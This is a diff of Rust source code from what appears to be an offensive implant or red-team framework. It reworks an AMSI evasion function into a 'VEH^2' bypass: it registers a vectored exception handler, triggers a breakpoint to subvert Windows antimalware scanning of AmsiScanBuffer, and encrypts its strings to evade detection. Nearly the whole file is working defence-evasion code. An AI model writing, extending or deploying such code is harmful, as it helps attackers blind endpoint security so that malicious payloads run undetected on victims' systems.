@@ -1,29 +1,51 @@
 use std::ffi::c_void;
 
-use shared_no_std::export_resolver;
-use shared_no_std::export_resolver::ExportResolveError;
 use str_crypter::{decrypt_string, sc};
 use windows_sys::Win32::System::{
-    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
+    Diagnostics::Debug::{AddVectoredExceptionHandler, WriteProcessMemory},
+    Threading::GetCurrentProcess,
 };
 
-use crate::utils::console::print_info;
+use crate::{
+    evasion::veh::{addr_of_amsi_scan_buf, veh_handler},
+    utils::console::{print_failed, print_info},
+};
 
-/// Patches AMSI in the current process if the AMSI patching feature flag is enabled. This function can
+/// Evades AMSI in the current process if the AMSI patching feature flag is enabled. This function can
 /// be called without checking whether the feature flag is enabled, as the check happens within the
 /// function.
-pub fn evade_amsi() {
+///
+/// **NOTE**: This function WILL NOT load amsi for you or check if it is loaded ahead of time. That
+/// responsibility is on the caller.
+///
+/// # Returns
+/// The function will return a `bool` indicating whether the AMSI evasion was successful; returns `false`
+/// if it failed.
+pub fn evade_amsi() -> bool {
     #[cfg(feature = "patch_amsi")]
     {
         // NOTE: Disabling for now in favour of the possibly more stealthy VEH^2 technique
         // amsi_patch_ntdll();
 
-        return;
+        //
+        // The best shot we got for VEH^2 in determining if it was successful is checking that the DLL is
+        // loaded.. if not, it will not work and should return false, so check that before continuing.
+        //
+        if addr_of_amsi_scan_buf().is_none() {
+            return false;
+        }
+
+        //
+        // Ok now call actual technique
+        //
+        amsi_veh_squared();
+
+        return true;
     }
 
     print_info(sc!("WARNING: Not patching AMSI. This could be dangerous.", 49).unwrap());
+    false
 }
-
 fn amsi_patch_ntdll() {
     use shared_no_std::export_resolver::resolve_address;
 
@@ -61,4 +83,16 @@ fn amsi_patch_ntdll() {
     };
 }
 
-fn amsi_veh_squared() {}
+#[inline(always)]
+fn amsi_veh_squared() -> bool {
+    let h = unsafe { AddVectoredExceptionHandler(1, Some(veh_handler)) };
+    if h.is_null() {
+        print_failed(sc!("Failed to execute AddVectoredExceptionHandler", 0xEF).unwrap());
+        return false;
+    }
+
+    // This is statically (and/or at runtime) probably quite easy to detect immediately after calling AVEH??
+    unsafe { core::arch::asm!("int3") };
+
+    true
+}
